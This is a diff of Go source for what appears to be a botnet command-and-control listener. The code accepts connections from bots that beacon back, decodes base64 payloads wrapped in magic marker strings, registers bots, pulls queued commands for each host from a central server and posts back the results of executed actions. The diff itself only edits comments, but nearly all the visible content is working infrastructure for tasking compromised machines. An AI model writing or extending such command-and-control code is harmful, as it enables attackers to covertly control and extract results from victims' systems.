@@ -37,6 +37,7 @@ var MAGICTERMBYTE = MAGICTERM[0]
 //MAGICTERMSTR is the ascii representation of the magic byte
 var MAGICTERMSTR = string(MAGICTERM)
 
+//loop and handle each bot connection as they beacon back
 func main() {
 	portStr := ":" + PORT
 	l, err := net.Listen("tcp4", portStr)
@@ -57,6 +58,7 @@ func main() {
 	}
 }
 
+//take the MAD payload and do stuff with it
 func connHandle(conn net.Conn) {
 	message, err := bufio.NewReader(conn).ReadString(MAGICTERMBYTE)
 	decMsg := decodePayload(message)
@@ -69,7 +71,7 @@ func connHandle(conn net.Conn) {
 	conn.Close()
 }
 
-// take buffer from conn handler, turn it into a string
+//take buffer from conn handler, turn it into a string
 func decodePayload(payload string) string {
 	encodedPayload := strings.Replace(payload, MAGICSTR, "", -1) //trim magic chars from payload
 	encodedPayload = strings.Replace(encodedPayload, MAGICTERMSTR, "", -1)
@@ -81,13 +83,14 @@ func decodePayload(payload string) string {
 	return string(data)
 }
 
+//turn the normal string into a MAD payload
 func encodePayload(data string) string {
 	encStr := base64.StdEncoding.EncodeToString([]byte(data))
 	fin := MAGICSTR + encStr + MAGICTERMSTR
 	return fin
 }
 
-// take string of payload, depending on mode/arguments: handle it
+// take string of payload, depending on mode/arguments: pass to handler functions
 func handlePayload(payload string) string {
 	splitPayload := strings.SplitN(payload, "||", 3)
 	mode := splitPayload[0]
@@ -129,6 +132,7 @@ func registerBot(payload string) string {
 	return string(body)
 }
 
+//split commands into a format the bot can easily read
 func parseCommands(cstr string) string {
 	retStr := ""
 	carr := strings.Split(cstr, "}, {")
@@ -145,7 +149,7 @@ func parseCommands(cstr string) string {
 	return retStr
 }
 
-// pull all commands from DB with associated uuid
+// pull all commands from DB associated with hostname
 func getCommands(payload string) string {
 	url := CORE + "/get/command"
 	uid := payload
@@ -166,6 +170,7 @@ func getCommands(payload string) string {
 	return prsd
 }
 
+// send the post request with actionID and result data
 func postResult(aid string, result string) {
 	url := CORE + "/add/actionresult"
 	cli := http.Client{}
